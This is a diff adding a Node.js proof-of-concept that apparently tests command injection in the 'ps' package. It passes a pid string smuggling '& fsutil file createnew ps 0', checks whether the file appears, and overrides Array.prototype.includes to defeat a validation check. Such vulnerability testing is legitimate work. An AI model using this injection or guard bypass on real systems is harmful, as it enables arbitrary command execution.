@@ -1,0 +1,25 @@
+Array.prototype.includes = function (key) {
+    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
+        return false;
+    } else {
+        return true;
+    }
+};
+const ps = require('ps');
+const fs = require('fs');
+const path = './ps';
+try {
+    if (fs.existsSync(path)) {
+        fs.unlinkSync(path);
+    }
+} catch (err) {
+    console.error(err);
+}
+file_exist = fs.existsSync(path);
+console.log('{ ' + file_exist + ', ' + false + ' }');
+ps.lookup({ pid: ' & fsutil file createnew ps 0' }, function (err, proc) {
+    file_exist = fs.existsSync(path);
+    console.log('{ ' + file_exist + ', ' + true + ' }');
+    fs.unlink(path, function (err) {
+    });
+});
